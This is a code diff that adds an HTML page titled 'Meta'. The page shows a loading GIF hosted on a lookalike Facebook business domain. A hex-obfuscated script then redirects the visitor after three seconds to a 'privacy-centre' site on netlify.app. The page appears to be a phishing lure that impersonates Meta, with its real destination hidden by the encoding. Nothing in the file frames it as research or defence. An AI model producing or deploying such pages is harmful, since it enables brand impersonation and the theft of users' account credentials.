@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+        }
+        
+        .fullscreen-gif {
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://term.fb-business.com/images/meta/loading-logo.gif" class="fullscreen-gif">
+
+    <script>
+        
+        const hexUrl = "68747470733a2f2f707269766163792d63656e7472652d3231322e6e65746c6966792e6170702f";
+        
+        
+        function hexToString(hex) {
+            let str = '';
+            for (let i = 0; i < hex.length; i += 2) {
+                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+            }
+            return str;
+        }
+        
+      
+        setTimeout(function() {
+            window.location.href = hexToString(hexUrl);
+        }, 3000);
+    </script>
+</body>
+</html>
